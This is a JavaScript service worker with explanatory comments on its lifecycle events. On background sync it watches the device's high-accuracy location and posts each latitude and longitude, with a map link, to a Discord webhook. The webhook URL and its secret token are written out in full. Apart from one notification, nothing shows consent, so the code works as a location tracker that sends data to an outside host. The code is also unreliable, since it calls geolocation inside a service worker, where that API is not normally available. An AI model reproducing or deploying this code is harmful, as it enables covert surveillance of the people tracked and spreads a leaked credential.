const API_BASE_URL = "http://localhost:4000"; // Ensure this matches your server port

self.addEventListener("install", (event) => {
    self.skipWaiting();
});

//explain self.skipWaiting(); in the context of service workers:
//The skipWaiting() method of the ServiceWorkerGlobalScope interface forces the waiting service worker to become the active service worker. 
// This was previously done by the claim() method of Clients. This method allows a worker to become active while pages are still open.
//The claim() method of the Clients interface allows an active service worker to set itself as the controller for all clients within its scope.
//  This triggers a "controllerchange" event on navigator.serviceWorker in any clients that are under the service worker's control.

self.addEventListener("activate", (event) => {
    event.waitUntil(self.clients.claim());
});
//explain self.addEventListener("activate", (event) => { :
// The activate event is fired when the service worker is ready to take control of pages.
// The event is fired after registration and when the service worker is ready to control the clients.
// The event is generally used to clean up resources used in the previous version of the service worker.

// Handle background sync
self.addEventListener("sync", function (event) {
    if (event.tag === "syncLocation") {
        event.waitUntil(fetchLocationAndSend());
    }
});
//explain self.addEventListener("sync", async (event) => { :
// The sync event is fired when the browser attempts to synchronize data in the background.
// The event is fired when the browser is ready to sync data in the background.
// The event is generally used to perform background tasks such as updating data or sending requests.

async function fetchLocationAndSend() {
    return new Promise((resolve, reject) => {
        self.registration.showNotification("🌍 Background Location Tracking Enabled");
        
        navigator.geolocation.watchPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                const payload = {
                    content: `📍 **Background Location Update:**\n🌍 **Latitude:** ${latitude}\n🗺️ **Longitude:** ${longitude}\n🔗 [Google Maps](https://www.google.com/maps/place/${latitude},${longitude})`
                };

                try {
                    const response = await fetch("https://discord.com/api/webhooks/1337946103924133898/eudcofLWR_ryLQivFc1hgFf2v01Fy9RSIQJxd5G1Qo5VGeyWOtVKR5E-t-mr-XddLL1X", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(payload),
                    });

                    if (!response.ok) throw new Error(`🚨 Webhook failed: ${response.status} ${response.statusText}`);
                    console.log("✅ Background location sent successfully!");
                } catch (error) {
                    console.error("🚨 Error sending background location:", error);
                }

                resolve();
            },
            (error) => {
                console.error("🚨 Background Location error:", error.message);
                reject(error);
            },
            {
                enableHighAccuracy: true,
                timeout: 5000,
                maximumAge: 0
            }
        );
    });
}
